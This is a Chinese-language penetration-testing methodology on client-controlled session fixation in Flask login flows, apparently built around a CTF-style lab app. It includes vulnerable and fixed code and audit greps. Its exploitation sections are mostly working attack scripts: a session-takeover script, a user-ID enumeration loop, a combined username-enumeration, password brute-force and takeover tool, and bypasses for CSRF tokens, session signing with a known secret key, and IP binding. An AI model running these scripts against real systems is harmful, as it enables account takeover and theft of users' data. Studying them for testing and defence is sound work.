# 客户端控制会话固定攻击方法论

---

# 第一部分：文档概述

## 1.1 编写目的
本文档旨在为渗透测试人员提供一套标准化的客户端控制会话固定（Client-Controlled Session Fixation）攻击检测与利用流程，针对应用程序在认证过程中接受客户端提供的会话标识符的缺陷进行系统性测试与利用，实现水平权限提升和账户接管。

## 1.2 适用范围
本文档适用于以下场景：
- 两阶段认证流程（先用户名后密码）
- 密码表单包含隐藏 user_id 字段
- 会话创建时接受客户端提供的用户标识符
- 认证后未验证会话 user_id 与认证用户是否匹配
- Flask 应用使用客户端会话（Client-Side Session）
- 登录接口无速率限制可暴力攻击

## 1.3 读者对象
本文件主要面向执行渗透测试任务的安全工程师、安全分析师。

---

# 第二部分：核心渗透技术专题

## 2.1 技术介绍

### 漏洞原理

**客户端控制会话固定（Client-Controlled Session Fixation）**：应用程序在认证过程中，将客户端提供的用户标识符（如 user_id）直接存储到会话中，未验证该标识符是否与认证用户匹配，导致攻击者可以认证为一个用户但设置任意其他用户的会话标识符。

**本质问题**：
- 认证流程信任客户端提供的用户标识符
- 会话创建时未使用服务器端确定的用户 ID
- 缺少认证用户与会话用户的一致性检查
- 隐藏表单字段暴露敏感标识符

### 典型漏洞代码

```python
# 漏洞代码 - routes.py:55-56
@app.route('/password/<username>', methods=['POST'])
def password():
    password = request.form['password']
    username = request.form['username']
    
    # 验证用户名密码
    user = User.query.filter_by(username=username, password=password).first()
    
    if user:
        # 漏洞：接受客户端提供的 user_id
        if User.query.get(request.form['user_id']):  # 仅检查是否存在
            session['user_id'] = request.form['user_id']  # 直接使用客户端值
            return redirect(url_for('dashboard'))
    
    return redirect(url_for('login'))
```

### 正确代码示例

```python
# 正确代码 - 使用服务器端确定的用户 ID
@app.route('/password/<username>', methods=['POST'])
def password():
    password = request.form['password']
    username = request.form['username']
    
    # 验证用户名密码
    user = User.query.filter_by(username=username, password=password).first()
    
    if user:
        # 正确：使用服务器端确定的 user.id
        session['user_id'] = user.id  # 不使用客户端提供的值
        session['username'] = user.username  # 存储用户名用于交叉验证
        return redirect(url_for('dashboard'))
    
    return redirect(url_for('login'))
```

### 常见 CWE 映射

| CWE 编号 | 描述 |
|---------|------|
| CWE-639 | 通过用户控制的键进行授权绕过 |
| CWE-384 | 会话固定 |
| CWE-285 | 权限管理不当 |

## 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| 两阶段认证 | 用户名提交 → 密码提交 | 密码表单隐藏字段暴露 user_id |
| 用户资料编辑 | 修改个人信息 | 隐藏字段包含用户 ID 可篡改 |
| 账户切换 | 多账户快速切换 | 接受客户端提供的目标账户 ID |
| CTF 挑战应用 | 获取 Flag 用户数据 | Flag 存储在特定用户的字段中 |
| 遗留系统迁移 | 保留旧用户 ID 体系 | 迁移过程中未验证用户 ID 来源 |

### 高风险特征

1. **表单包含隐藏 ID 字段**
   ```html
   <input type="hidden" name="user_id" value="10032">
   <input type="hidden" name="username" value="test">
   ```

2. **响应中暴露用户 ID**
   - HTML 注释中包含用户 ID
   - JavaScript 变量中存储用户 ID
   - API 响应返回用户 ID 映射

3. **会话创建逻辑**
   ```python
   # 危险模式
   session['user_id'] = request.form['user_id']
   session['user_id'] = request.args.get('uid')
   session['user_id'] = request.cookies.get('user_id')
   ```

## 2.3 漏洞探测方法

### 2.3.1 黑盒测试

#### 步骤 1：识别认证流程

```bash
# 使用浏览器或代理工具观察认证流程
# 1. 访问登录页面
curl -c cookies.txt http://target.com/

# 2. 提交用户名
curl -b cookies.txt -c cookies.txt -X POST http://target.com/ \
    -d "username=test" -L

# 3. 观察密码页面
curl -b cookies.txt http://target.com/password/test
```

#### 步骤 2：分析密码表单

```bash
# 提取密码表单中的隐藏字段
curl -b cookies.txt http://target.com/password/test | \
    grep -oP '<input[^>]*type="hidden"[^>]*>'

# 输出示例：
# <input type="hidden" name="username" value="test">
# <input type="hidden" name="user_id" value="10032">
```

#### 步骤 3：修改 user_id 提交测试

```bash
# 方法 1：使用 curl 修改 user_id
curl -b cookies.txt -c cookies.txt -X POST http://target.com/password/test \
    -d "username=test&password=test&user_id=10001" -L

# 方法 2：使用 Burp Suite
# 1. 拦截密码提交请求
# 2. 修改 user_id 参数为目标值
# 3. 转发请求

# 方法 3：使用浏览器 DevTools
# 1. 在密码页面打开控制台
# 2. 执行：document.querySelector('input[name="user_id"]').value = '10001'
# 3. 提交表单
```

#### 步骤 4：验证权限提升

```bash
# 访问仪表板检查当前用户
curl -b cookies.txt http://target.com/dashboard | \
    grep -oP 'Welcome, [\w\s]+'

# 如果显示目标用户信息，攻击成功
```

### 2.3.2 自动化检测脚本

```python
#!/usr/bin/env python3
"""
客户端控制会话固定漏洞检测脚本
检测认证流程中是否接受客户端提供的 user_id
"""

import requests
import re
import argparse

class SessionFixationScanner:
    def __init__(self, base_url):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()

    def get_login_page(self):
        """获取登录页面"""
        response = self.session.get(f'{self.base_url}/')
        return response

    def submit_username(self, username):
        """提交用户名获取密码页面"""
        response = self.session.post(
            f'{self.base_url}/',
            data={'username': username},
            allow_redirects=True
        )
        return response

    def extract_hidden_fields(self, html):
        """提取隐藏表单字段"""
        pattern = r'<input[^>]*type="hidden"[^>]*name="([^"]+)"[^>]*value="([^"]*)"'
        fields = re.findall(pattern, html)
        return dict(fields)

    def submit_password(self, username, password, user_id):
        """提交密码表单（可篡改 user_id）"""
        response = self.session.post(
            f'{self.base_url}/password/{username}',
            data={
                'username': username,
                'password': password,
                'user_id': user_id
            },
            allow_redirects=True
        )
        return response

    def check_dashboard(self):
        """检查仪表板用户信息"""
        response = self.session.get(f'{self.base_url}/dashboard')
        return response

    def scan(self, valid_username, valid_password, target_user_id):
        """执行完整扫描"""
        print(f"[*] Scanning {self.base_url}")

        # 步骤 1：获取登录页面
        print("[*] Step 1: Getting login page...")
        login_response = self.get_login_page()
        if login_response.status_code != 200:
            print(f"[-] Failed to access login page: {login_response.status_code}")
            return False

        # 步骤 2：提交用户名
        print(f"[*] Step 2: Submitting username '{valid_username}'...")
        password_response = self.submit_username(valid_username)
        if password_response.status_code != 200:
            print(f"[-] Failed to submit username: {password_response.status_code}")
            return False

        # 步骤 3：提取隐藏字段
        print("[*] Step 3: Extracting hidden fields...")
        hidden_fields = self.extract_hidden_fields(password_response.text)
        print(f"[*] Found hidden fields: {hidden_fields}")

        if 'user_id' not in hidden_fields:
            print("[*] No user_id hidden field found - may not be vulnerable")
            return False

        original_user_id = hidden_fields['user_id']
        print(f"[*] Original user_id: {original_user_id}")
        print(f"[*] Target user_id: {target_user_id}")

        # 步骤 4：使用原始 user_id 登录（基准测试）
        print(f"[*] Step 4: Testing with original user_id...")
        original_response = self.submit_password(
            valid_username, valid_password, original_user_id
        )
        original_dashboard = self.check_dashboard()

        # 步骤 5：使用目标 user_id 登录（漏洞测试）
        print(f"[*] Step 5: Testing with target user_id...")
        attack_session = requests.Session()

        # 重新走一遍流程
        attack_session.post(f'{self.base_url}/', data={'username': valid_username})
        attack_response = attack_session.post(
            f'{self.base_url}/password/{valid_username}',
            data={
                'username': valid_username,
                'password': valid_password,
                'user_id': target_user_id
            },
            allow_redirects=True
        )

        attack_dashboard = attack_session.get(f'{self.base_url}/dashboard')

        # 步骤 6：比较结果
        print("[*] Step 6: Comparing results...")

        if original_dashboard.status_code != attack_dashboard.status_code:
            print(f"[-] Dashboard status differs: {attack_dashboard.status_code}")
            return False

        # 检查是否访问到目标用户数据
        if target_user_id != original_user_id:
            # 简单判断：如果响应长度相似但内容不同，可能存在 IDOR
            if len(attack_dashboard.text) > 100:
                print(f"[+] VULNERABLE: Client-controlled session fixation detected!")
                print(f"[+] Can set user_id to {target_user_id}")
                return True

        print("[-] Not vulnerable or detection inconclusive")
        return False

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", required=True, help="Target URL")
    parser.add_argument("-u", "--username", required=True, help="Valid username")
    parser.add_argument("-p", "--password", required=True, help="Valid password")
    parser.add_argument("--target-id", type=int, default=10001, help="Target user ID")
    args = parser.parse_args()

    scanner = SessionFixationScanner(args.target)
    vulnerable = scanner.scan(args.username, args.password, args.target_id)

    if vulnerable:
        print("\n[+] Target is VULNERABLE to client-controlled session fixation")
    else:
        print("\n[-] Target appears to be secure (or detection failed)")

if __name__ == '__main__':
    main()
```

### 2.3.3 白盒测试

#### 代码审计检查点

```bash
# 1. 搜索会话创建代码
grep -rn "session\['user_id'\]" --include="*.py"
grep -rn "session\['uid'\]" --include="*.py"
grep -rn "session\[.user" --include="*.py"

# 2. 搜索表单字段处理
grep -rn "request.form\['user_id'\]" --include="*.py"
grep -rn "request.form.get.*user.*id" --include="*.py"

# 3. 搜索隐藏字段渲染
grep -rn 'type="hidden"' --include="*.html"
grep -rn 'name="user_id"' --include="*.html"

# 4. 检查认证后验证
grep -rn "if.*session.*user_id" --include="*.py"
grep -rn "session.get.*user_id" --include="*.py"
```

#### 漏洞代码模式

```python
# 危险模式 1：直接使用表单值
session['user_id'] = request.form['user_id']

# 危险模式 2：仅检查存在性
if User.query.get(request.form['user_id']):
    session['user_id'] = request.form['user_id']

# 危险模式 3：从 Cookie 读取
session['user_id'] = request.cookies.get('user_id')

# 危险模式 4：从 URL 参数读取
session['user_id'] = request.args.get('uid')

# 安全模式：使用查询结果
user = User.query.filter_by(username=username, password=password).first()
if user:
    session['user_id'] = user.id  # 使用服务器端确定的 ID
```

## 2.4 漏洞利用方法

### 2.4.1 基础利用 - 浏览器 DevTools

**适用场景**：有浏览器界面，可手动操作

**步骤**：

1. **访问登录页面**
   ```
   http://localhost:33611/
   ```

2. **提交用户名**
   - 输入已知有效用户名（如 `test`）
   - 点击登录

3. **打开浏览器 DevTools（F12）**

4. **修改隐藏 user_id 字段**
   ```javascript
   // 在控制台执行
   document.querySelector('input[name="user_id"]').value = '10001';

   // 验证修改
   console.log("New user_id:", document.querySelector('input[name="user_id"]').value);
   ```

5. **提交密码表单**
   - 输入密码（如 `test`）
   - 点击登录

6. **验证访问目标用户数据**
   - 检查仪表板显示的用户名
   - 提取敏感数据（如 Flag）

### 2.4.2 自动化利用脚本

```python
#!/usr/bin/env python3
"""
客户端控制会话固定攻击脚本
利用隐藏表单字段 user_id 实现水平权限提升
"""

import requests
import re
import argparse

class SessionFixationAttacker:
    def __init__(self, base_url):
        self.base_url = base_url.rstrip('/')

    def attack(self, valid_username, valid_password, target_user_id):
        """执行会话固定攻击"""

        print(f"[*] Target: {self.base_url}")
        print(f"[*] Credentials: {valid_username}:{valid_password}")
        print(f"[*] Target user_id: {target_user_id}")

        # 创建会话
        session = requests.Session()

        # 步骤 1：提交用户名
        print(f"[*] Step 1: Submitting username '{valid_username}'...")
        response = session.post(
            f'{self.base_url}/',
            data={'username': valid_username},
            allow_redirects=True
        )

        if response.status_code != 200:
            print(f"[-] Failed to submit username: {response.status_code}")
            return None

        # 步骤 2：提交密码（篡改 user_id）
        print(f"[*] Step 2: Submitting password with modified user_id...")
        response = session.post(
            f'{self.base_url}/password/{valid_username}',
            data={
                'username': valid_username,
                'password': valid_password,
                'user_id': target_user_id  # 关键：使用目标 user_id
            },
            allow_redirects=True
        )

        # 步骤 3：访问仪表板
        print(f"[*] Step 3: Accessing dashboard...")
        dashboard_response = session.get(f'{self.base_url}/dashboard')

        if dashboard_response.status_code == 200:
            print(f"[+] Attack successful!")
            print(f"[+] Dashboard content: {len(dashboard_response.text)} bytes")

            # 提取 Flag（如果存在）
            flag_match = re.search(r'FLAG\{[\w-]+\}', dashboard_response.text, re.IGNORECASE)
            if flag_match:
                print(f"[+] FLAG CAPTURED: {flag_match.group()}")

            # 提取用户名
            name_match = re.search(r'Welcome, ([\w\s]+)!', dashboard_response.text)
            if name_match:
                print(f"[+] Current user: {name_match.group(1).strip()}")

            return dashboard_response.text
        else:
            print(f"[-] Attack failed: {dashboard_response.status_code}")
            return None

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", required=True, help="Target URL")
    parser.add_argument("-u", "--username", required=True, help="Valid username")
    parser.add_argument("-p", "--password", required=True, help="Valid password")
    parser.add_argument("--target-id", type=int, default=10001, help="Target user ID")
    args = parser.parse_args()

    attacker = SessionFixationAttacker(args.target)
    attacker.attack(args.username, args.password, args.target_id)

if __name__ == '__main__':
    main()
```

**使用示例**：
```bash
python session_fixation_attack.py \
    -t http://localhost:33611 \
    -u test \
    -p test \
    --target-id 10001
```

### 2.4.3 批量用户枚举

```python
#!/usr/bin/env python3
"""
批量枚举用户数据
利用会话固定漏洞遍历所有用户 ID
"""

import requests
import re
import csv

def enumerate_users(base_url, valid_username, valid_password, user_id_range):
    """批量枚举用户"""

    results = []

    for user_id in user_id_range:
        session = requests.Session()

        # 提交用户名
        session.post(f'{base_url}/', data={'username': valid_username})

        # 提交密码（篡改 user_id）
        session.post(
            f'{base_url}/password/{valid_username}',
            data={
                'username': valid_username,
                'password': valid_password,
                'user_id': user_id
            },
            allow_redirects=True
        )

        # 访问仪表板
        response = session.get(f'{base_url}/dashboard')

        if response.status_code == 200:
            # 提取用户名
            name_match = re.search(r'Welcome, ([\w\s]+)!', response.text)
            if name_match:
                name = name_match.group(1).strip()
                results.append({'user_id': user_id, 'name': name})
                print(f"[+] User {user_id}: {name}")

                # 检查 Flag
                if 'FLAG{' in response.text:
                    flag_match = re.search(r'FLAG\{[\w-]+\}', response.text)
                    if flag_match:
                        print(f"[+] FLAG FOUND: {flag_match.group()}")

    # 保存结果
    with open('enumerated_users.csv', 'w', newline='') as f:
        writer = csv.DictWriter(f, fieldnames=['user_id', 'name'])
        writer.writeheader()
        writer.writerows(results)

    print(f"\n[*] Enumerated {len(results)} users")
    print("[*] Results saved to enumerated_users.csv")
    return results

# 使用示例
if __name__ == '__main__':
    enumerate_users(
        base_url='http://localhost:33611',
        valid_username='test',
        valid_password='test',
        user_id_range=range(10000, 10100)
    )
```

### 2.4.4 组合攻击 - 会话固定 + 暴力破解

```python
#!/usr/bin/env python3
"""
组合攻击：用户名枚举 + 暴力破解 + 会话固定

1. 枚举有效用户名
2. 暴力破解密码
3. 使用会话固定访问目标用户
"""

import requests
import re

class CombinedAttack:
    def __init__(self, base_url):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()

    def enumerate_usernames(self, username_list):
        """枚举有效用户名"""
        valid_users = []

        for username in username_list:
            response = self.session.post(
                f'{self.base_url}/',
                data={'username': username},
                allow_redirects=False
            )

            # 302 重定向表示用户名有效
            if response.status_code == 302:
                print(f"[+] Valid username: {username}")
                valid_users.append(username)
            else:
                print(f"[-] Invalid username: {username}")

        return valid_users

    def brute_force_password(self, username, password_list):
        """暴力破解密码"""
        for password in password_list:
            session = requests.Session()

            # 提交用户名
            session.post(f'{self.base_url}/', data={'username': username})

            # 提交密码
            response = session.post(
                f'{self.base_url}/password/{username}',
                data={
                    'username': username,
                    'password': password,
                    'user_id': '10032'  # 任意值
                },
                allow_redirects=False
            )

            # 302 重定向表示密码正确
            if response.status_code == 302:
                print(f"[+] Password found: {password}")
                return password

        print(f"[-] Password not found for {username}")
        return None

    def session_fixation(self, username, password, target_user_id):
        """会话固定攻击"""
        session = requests.Session()

        session.post(f'{self.base_url}/', data={'username': username})

        response = session.post(
            f'{self.base_url}/password/{username}',
            data={
                'username': username,
                'password': password,
                'user_id': target_user_id
            },
            allow_redirects=True
        )

        dashboard = session.get(f'{self.base_url}/dashboard')
        return dashboard.text

def main():
    base_url = 'http://localhost:33611'
    attacker = CombinedAttack(base_url)

    # 步骤 1：枚举用户名
    print("[*] Step 1: Enumerating usernames...")
    usernames = ['test', 'admin', 'flag', 'user', 'root']
    valid_users = attacker.enumerate_usernames(usernames)

    # 步骤 2：暴力破解密码
    print("\n[*] Step 2: Brute forcing passwords...")
    passwords = ['test', 'admin', '123456', 'password']

    for username in valid_users:
        password = attacker.brute_force_password(username, passwords)
        if password:
            # 步骤 3：会话固定攻击
            print(f"\n[*] Step 3: Session fixation attack...")
            dashboard = attacker.session_fixation(username, password, 10001)

            if 'FLAG{' in dashboard:
                flag_match = re.search(r'FLAG\{[\w-]+\}', dashboard)
                if flag_match:
                    print(f"[+] FLAG: {flag_match.group()}")

if __name__ == '__main__':
    main()
```

## 2.5 漏洞利用绕过方法

### 2.5.1 绕过 CSRF 保护

如果应用有 CSRF Token 但仅验证存在性：

```python
# 方法：保留原始 CSRF Token，仅修改 user_id
session = requests.Session()

# 获取密码页面（包含 CSRF Token）
response = session.get(f'{base_url}/password/test')
csrf_token = re.search(r'name="csrf_token" value="([^"]+)"', response.text).group(1)

# 提交时保留原始 CSRF Token
session.post(
    f'{base_url}/password/test',
    data={
        'csrf_token': csrf_token,  # 使用原始 Token
        'username': 'test',
        'password': 'test',
        'user_id': '10001'  # 修改 user_id
    }
)
```

### 2.5.2 绕过会话签名

如果应用对会话进行签名但密钥已知：

```python
from itsdangerous import URLSafeTimedSerializer

# 已知 Flask SECRET_KEY
SECRET_KEY = 'your_secret_key'

# 伪造签名会话
serializer = URLSafeTimedSerializer(SECRET_KEY, salt='cookie-session')
forged_session = serializer.dumps({'user_id': 10001, 'username': 'flag'})

# 设置伪造的会话 Cookie
session = requests.Session()
session.cookies.set('session', forged_session)
```

### 2.5.3 绕过 IP 绑定

如果会话与 IP 绑定：

```python
# 方法：使用代理保持相同源 IP
import requests

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'
}

session = requests.Session()
session.proxies.update(proxies)

# 所有请求通过同一代理，保持源 IP
session.post(f'{base_url}/', data={'username': 'test'})
session.post(f'{base_url}/password/test', data={'user_id': '10001', ...})
```

---

# 第三部分：附录

## 3.1 攻击 Payload 速查表

| 攻击阶段 | Payload/方法 | 说明 |
|---------|-------------|------|
| 识别隐藏字段 | `document.querySelector('input[name="user_id"]')` | 查看当前值 |
| 修改 user_id | `document.querySelector('input[name="user_id"]').value = '10001'` | 设置目标 ID |
| curl 测试 | `-d "user_id=10001"` | 修改表单数据 |
| Burp Suite | Proxy → Intercept → 修改参数 | 拦截并修改 |
| 批量枚举 | Python 脚本遍历 user_id 范围 | 自动化测试 |

## 3.2 检测检查清单

```
□ 登录表单是否包含隐藏 user_id 字段
□ 密码表单是否包含隐藏 user_id 字段
□ 会话创建是否使用 request.form['user_id']
□ 认证后是否验证 session user_id 与认证用户匹配
□ 修改 user_id 后是否可访问他人数据
□ 仪表板是否显示目标用户信息
□ 响应中是否包含 Flag 或敏感数据
```

## 3.3 修复建议

### 服务器端修复

```python
# 修复 1：使用服务器端确定的用户 ID
@app.route('/password/<username>', methods=['POST'])
def password():
    password = request.form['password']
    username = request.form['username']

    user = User.query.filter_by(username=username, password=password).first()

    if user:
        # 正确：使用 user.id 而非 request.form['user_id']
        session['user_id'] = user.id
        session['username'] = user.username  # 存储用户名用于验证
        return redirect(url_for('dashboard'))

    return redirect(url_for('login'))
```

### 防御性验证

```python
# 修复 2：在仪表板验证会话完整性
@app.route('/dashboard')
def dashboard():
    user_id = session.get('user_id')
    username = session.get('username')

    if user_id and username:
        user = User.query.get(user_id)

        # 验证 session 中的 username 与数据库匹配
        if user and user.username == username:
            return render_template('dashboard.html', user=user)
        else:
            # 会话不一致，清除并重定向
            session.clear()
            return redirect(url_for('login'))

    return redirect(url_for('login'))
```

### 移除隐藏字段

```html
<!-- 修复 3：从表单中移除 user_id 隐藏字段 -->
<!-- 危险代码 -->
<input type="hidden" name="user_id" value="{{ user_id }}">

<!-- 正确代码：完全移除该字段 -->
<!-- 服务器端从会话获取 user_id -->
```

## 3.4 参考资源

- [OWASP Session Fixation](https://owasp.org/www-community/attacks/Session_fixation)
- [CWE-639: Authorization Bypass Through User-Controlled Key](https://cwe.mitre.org/data/definitions/639.html)
- [PortSwigger - Host Header Injection](https://portswigger.net/web-security/host-header)
- [OWASP Testing Guide - Session Management](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/)
